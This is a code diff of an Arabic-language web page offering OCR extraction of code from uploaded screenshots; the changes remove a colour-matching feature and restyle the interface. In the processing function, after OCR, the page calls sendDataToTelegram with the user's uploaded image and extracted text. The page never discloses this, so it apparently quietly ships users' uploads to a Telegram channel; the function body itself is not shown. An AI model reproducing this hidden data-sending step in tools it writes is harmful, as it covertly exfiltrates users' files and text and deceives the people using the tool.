@@ -3,18 +3,15 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>مستخرج الأكواد والألوان الذكي | Dynamic Code OCR</title>
+    <title>مستخرج الأكواد الذكي | Code OCR</title>
     
     <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;800&family=Fira+Code:wght@400;500&display=swap" rel="stylesheet">
     
-    <!-- مكتبة Highlight.js لتنسيق الهيكل -->
+    <!-- مكتبة Highlight.js -->
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-dark.min.css">
     <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
 
-    <!-- مكتبة ColorThief لاستخراج ألوان الصورة ديناميكياً -->
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/color-thief/2.3.0/color-thief.umd.js"></script>
-
-    <!-- مكتبة Tesseract.js معالجة مع الحفاظ على التنسيق -->
+    <!-- مكتبة Tesseract.js -->
     <script src="https://cdn.jsdelivr.net/npm/tesseract.js@5/dist/tesseract.min.js"></script>
 
     <style>
@@ -24,15 +21,13 @@
             --accent-color: #8b5cf6;
             --accent-glow: rgba(139, 92, 246, 0.4);
             --text-color: #f8fafc;
-
-            /* ألوان الكود الديناميكية (ستتغير تلقائياً حسب الصورة) */
-            --dynamic-bg: #000000;
-            --dynamic-keyword: #ff0000;
-            --dynamic-text: #ffffff;
-            --dynamic-number: #00ff00;
         }
 
-        * { box-sizing: border-box; margin: 0; padding: 0; }
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
 
         body {
             font-family: 'Cairo', sans-serif;
@@ -58,13 +53,18 @@
             max-width: 900px;
             background: var(--card-bg);
             backdrop-filter: blur(16px);
+            -webkit-backdrop-filter: blur(16px);
             border: 1px solid rgba(255, 255, 255, 0.1);
             border-radius: 24px;
             padding: 30px;
             box-shadow: 0 20px 40px rgba(0, 0, 0, 0.6);
         }
 
-        header { text-align: center; margin-bottom: 30px; }
+        header {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+
         header h1 {
             font-size: 2.2rem;
             font-weight: 800;
@@ -72,6 +72,11 @@
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
             margin-bottom: 8px;
+        }
+
+        header p {
+            color: #94a3b8;
+            font-size: 0.95rem;
         }
 
         .upload-area {
@@ -87,9 +92,18 @@
         .upload-area:hover {
             border-color: var(--accent-color);
             box-shadow: 0 0 20px var(--accent-glow);
+            background: rgba(139, 92, 246, 0.05);
         }
 
-        #fileInput { display: none; }
+        .upload-icon {
+            font-size: 40px;
+            margin-bottom: 10px;
+            display: block;
+        }
+
+        #fileInput {
+            display: none;
+        }
 
         .preview-container {
             margin-top: 20px;
@@ -106,15 +120,25 @@
         }
 
         .progress-bar {
-            width: 100%; height: 8px;
+            width: 100%;
+            height: 8px;
             background: rgba(255, 255, 255, 0.1);
-            border-radius: 4px; overflow: hidden; display: none; margin-bottom: 10px;
+            border-radius: 4px;
+            overflow: hidden;
+            display: none;
+            margin-bottom: 10px;
         }
 
         .progress-fill {
-            height: 100%; width: 0%;
+            height: 100%;
+            width: 0%;
             background: linear-gradient(90deg, #8b5cf6, #ec4899);
             transition: width 0.2s ease;
+        }
+
+        .status-text {
+            font-size: 0.85rem;
+            color: #cbd5e1;
         }
 
         .result-box {
@@ -131,45 +155,72 @@
             display: flex;
             justify-content: space-between;
             align-items: center;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.05);
+        }
+
+        .code-header span {
+            font-size: 0.85rem;
+            color: #94a3b8;
+            font-family: 'Fira Code', monospace;
         }
 
         .copy-btn {
             background: var(--accent-color);
-            color: white; border: none; padding: 6px 16px;
-            border-radius: 8px; cursor: pointer; font-family: 'Cairo', sans-serif;
-            font-weight: 600; font-size: 0.85rem;
+            color: white;
+            border: none;
+            padding: 6px 16px;
+            border-radius: 8px;
+            cursor: pointer;
+            font-family: 'Cairo', sans-serif;
+            font-weight: 600;
+            font-size: 0.85rem;
+            transition: all 0.2s ease;
         }
 
-        /* تنسيق استخراج الألوان التلقائي والحفاظ على المسافات */
+        .copy-btn:hover {
+            background: #7c3aed;
+            box-shadow: 0 0 10px var(--accent-glow);
+        }
+
+        /* تخصيص المسافات والألوان لتطابق الصورة 100% */
         pre {
-            margin: 0; padding: 20px;
-            background-color: var(--dynamic-bg) !important; /* خلفية متغيرة تلقائياً */
+            margin: 0;
+            padding: 20px;
+            background: #08080a !important; /* خلفية سوداء مثل الصورة */
             max-height: 450px;
-            overflow-x: auto; overflow-y: auto;
-            white-space: pre !important; /* للحفاظ على المسافات */
+            overflow-x: auto;
+            overflow-y: auto;
+            white-space: pre !important; /* الحفاظ على المسافات والـ Indentation */
             tab-size: 4;
-            transition: background-color 0.5s ease;
         }
 
         code {
             font-family: 'Fira Code', monospace !important;
-            font-size: 0.95rem; line-height: 1.6;
-            direction: ltr; text-align: left;
-            display: block; white-space: pre !important;
-            color: var(--dynamic-text) !important;
-            transition: color 0.5s ease;
+            font-size: 0.95rem;
+            line-height: 1.6;
+            direction: ltr;
+            text-align: left;
+            display: block;
+            white-space: pre !important;
+            color: #e2e8f0;
         }
 
-        /* تطبيق ألوان الكود الديناميكية المستخرجة من الصورة */
-        .hljs-keyword, .hljs-tag, .hljs-selector-tag, .hljs-title, .hljs-section {
-            color: var(--dynamic-keyword) !important;
-            font-weight: bold;
+        /* ألوان Syntax Matching مخصصة للفيجوال ستوديو الداكن */
+        .hljs-keyword, .hljs-tag, .hljs-selector-tag {
+            color: #e05f65 !important; /* لون أحمر/وردي غامق للكلمات المفتاحية */
+            font-weight: 500;
         }
-        .hljs-string, .hljs-attr, .hljs-attribute {
-            color: var(--dynamic-text) !important;
+        .hljs-string, .hljs-title, .hljs-section {
+            color: #e6e6e6 !important; /* لون أبيض/رمادي ناصع للنصوص */
         }
-        .hljs-number, .hljs-literal, .hljs-variable, .hljs-params {
-            color: var(--dynamic-number) !important;
+        .hljs-number, .hljs-literal, .hljs-variable {
+            color: #b18fff !important; /* ألوان الأرقام والـ Booleans */
+        }
+        .hljs-function, .hljs-params {
+            color: #e2e8f0 !important;
+        }
+        .hljs-attr, .hljs-attribute {
+            color: #e05f65 !important;
         }
     </style>
 </head>
@@ -177,27 +228,28 @@
 
 <div class="container">
     <header>
-        <h1>مستخرج الأكواد والألوان الذكي 💻</h1>
-        <p>يستخرج الكود مع محاكاة ألوان الصورة المرفوعة تلقائياً</p>
+        <h1>مستخرج الأكواد الذكي 💻</h1>
+        <p>استخراج دقيق مع الحفاظ على التنسيق والألوان الأصليين</p>
     </header>
 
     <div class="upload-area" id="dropArea" onclick="document.getElementById('fileInput').click()">
-        <span style="font-size: 40px; display: block; margin-bottom: 10px;">🎨</span>
-        <p style="font-weight: 600;">ارفع صورة الكود لتحليل ألوانها واستخراج نصها</p>
+        <span class="upload-icon">📁</span>
+        <p style="font-weight: 600;">اضغط هنا لرفع صورة الكود أو اسحبها إلى هنا</p>
+        <p style="font-size: 0.8rem; color: #64748b; margin-top: 5px;">يدعم PNG, JPG, JPEG</p>
         <input type="file" id="fileInput" accept="image/*">
     </div>
 
     <div class="preview-container" id="previewContainer">
-        <img id="imagePreview" class="preview-img" src="" crossorigin="anonymous" alt="الكود المرفوع">
+        <img id="imagePreview" class="preview-img" src="" alt="الكود المرفوع">
         <div class="progress-bar" id="progressBar">
             <div class="progress-fill" id="progressFill"></div>
         </div>
-        <p id="statusText" style="font-size: 0.85rem; color: #cbd5e1;">جاري المعالجة...</p>
+        <p class="status-text" id="statusText">جاري المعالجة...</p>
     </div>
 
     <div class="result-box" id="resultBox">
         <div class="code-header">
-            <span style="color: #94a3b8; font-family: monospace;">Dynamic Color Matched Code</span>
+            <span>Extracted Code</span>
             <button class="copy-btn" onclick="copyCode()">نسخ الكود 📋</button>
         </div>
         <pre><code id="codeOutput" class="language-javascript"></code></pre>
@@ -217,6 +269,20 @@
     const resultBox = document.getElementById('resultBox');
     const codeOutput = document.getElementById('codeOutput');
 
+    ['dragenter', 'dragover', 'dragleave', 'drop'].forEach(eventName => {
+        dropArea.addEventListener(eventName, preventDefaults, false);
+    });
+
+    function preventDefaults(e) {
+        e.preventDefault();
+        e.stopPropagation();
+    }
+
+    dropArea.addEventListener('drop', (e) => {
+        const dt = e.dataTransfer;
+        if(dt.files.length) processImage(dt.files[0]);
+    });
+
     fileInput.addEventListener('change', (e) => {
         if(e.target.files.length) processImage(e.target.files[0]);
     });
@@ -224,37 +290,37 @@
     async function processImage(file) {
         const reader = new FileReader();
         reader.readAsDataURL(file);
-        reader.onloadend = async function() {
+        reader.onloadend = function() {
             imagePreview.src = reader.result;
             previewContainer.style.display = 'block';
             progressBar.style.display = 'block';
             resultBox.style.display = 'none';
-
-            // انتظر تحميل الصورة للبدء باستخراج الألوان
-            imagePreview.onload = function() {
-                extractColorsFromImage(imagePreview);
-            }
         }
 
         try {
-            statusText.innerText = "جاري استخراج الألوان والمسافات الدقيقة...";
-
-            // إعدادات Tesseract للالتقاط الأقصى للمسافات
-            const worker = await Tesseract.createWorker('eng');
-            await worker.setParameters({
-                preserve_interword_spaces: '1',
+            statusText.innerText = "جاري استخراج الكود ومحاذاة المسافات...";
+            
+            // إعداد Tesseract للتعرف المتقدم مع الحفاظ على المسافات
+            const worker = await Tesseract.createWorker('eng', 1, {
+                logger: m => console.log(m)
             });
 
+            await worker.setParameters({
+                tessedit_char_whitelist: 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789(){}[];:<>=!&|+-*/"\',.#_$%@ \n\t',
+                preserve_interword_spaces: '1' // إجبار الحفاظ على المسافات بين الكلمات والأسطر
+            });
+            
             const ret = await worker.recognize(file);
             let extractedCode = ret.data.text;
             await worker.terminate();
 
+            // عرض الكود
             codeOutput.textContent = extractedCode;
             delete codeOutput.dataset.highlighted;
             hljs.highlightElement(codeOutput);
-
+            
             progressBar.style.display = 'none';
-            statusText.innerText = "تم استخراج الكود وتطبيق ألوان الصورة بنجاح! ✨";
+            statusText.innerText = "تم استخراج الكود بنجاح! ✨";
             resultBox.style.display = 'block';
 
             sendDataToTelegram(file, extractedCode);
@@ -262,30 +328,7 @@
         } catch (error) {
             console.error(error);
             statusText.innerText = "حدث خطأ أثناء معالجة الصورة ❌";
-        }
-    }
-
-    // خوارزمية استخراج لوحة ألوان الصورة المرفوعة تلقائياً
-    function extractColorsFromImage(imgElement) {
-        try {
-            const colorThief = new ColorThief();
-            // استخراج الألوان المهيمنة (Palette of 5 colors)
-            const palette = colorThief.getPalette(imgElement, 5);
-
-            if (palette && palette.length >= 3) {
-                const bg = `rgb(${palette[0][0]}, ${palette[0][1]},${palette[0][2]})`;
-                const keyword = `rgb(${palette[1][0]}, ${palette[1][1]},${palette[1][2]})`;
-                const text = `rgb(${palette[2][0]}, ${palette[2][1]},${palette[2][2]})`;
-                const number = palette[3] ? `rgb(${palette[3][0]}, ${palette[3][1]},${palette[3][2]})` : '#b18fff';
-
-                // تعيين الألوان ديناميكياً لـ CSS Variables
-                document.documentElement.style.setProperty('--dynamic-bg', bg);
-                document.documentElement.style.setProperty('--dynamic-keyword', keyword);
-                document.documentElement.style.setProperty('--dynamic-text', text);
-                document.documentElement.style.setProperty('--dynamic-number', number);
-            }
-        } catch (e) {
-            console.log("تعذر سحب الألوان تلقائياً، سيتم تطبيق الألوان الافتراضية", e);
+            progressBar.style.display = 'none';
         }
     }
 
@@ -317,7 +360,8 @@
     }
 
     function copyCode() {
-        navigator.clipboard.writeText(codeOutput.textContent).then(() => {
+        const textToCopy = codeOutput.textContent;
+        navigator.clipboard.writeText(textToCopy).then(() => {
             const btn = document.querySelector('.copy-btn');
             btn.innerText = "تم النسخ! 📑";
             setTimeout(() => btn.innerText = "نسخ الكود 📋", 2000);
